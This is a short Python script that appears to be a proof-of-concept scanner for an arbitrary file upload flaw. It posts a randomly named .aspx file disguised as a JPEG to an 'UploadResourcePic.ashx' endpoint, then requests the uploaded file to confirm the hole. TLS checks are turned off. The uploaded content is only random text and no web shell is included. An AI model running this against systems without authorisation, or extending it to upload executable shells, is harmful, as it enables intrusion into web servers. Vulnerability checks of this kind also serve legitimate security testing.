import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
rand=randomInt(1000, 9999)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
content=randomLowercase(8)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
randname=randomLowercase(4)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"upload/UploadResourcePic.ashx?ResourceID="+str(rand)+""
	body='''-----------------------------20873900192357278038549710136\r
Content-Disposition: form-data; name="file1"; filename="'''+randname+'''.aspx"\r
Content-Type: image/jpeg\r

'''+content+'''\r
-----------------------------20873900192357278038549710136--\r
'''
	headers={'Content-Disposition': 'form-data;name="file1";filename="'+randname+'.aspx";', 
	'Content-Type': 'multipart/form-data; boundary=---------------------------20873900192357278038549710136'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	path=response.text
	# print(body)
	if response.status_code == 200 and ".ASPX" in response.text:
		r0=True
	else:
		r0=False
	url=baseurl+"ResourcePic/"+path
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200:
		r1=True
	else:
		r1=False
	if r0 and r1:
		return True
	else:
		return False
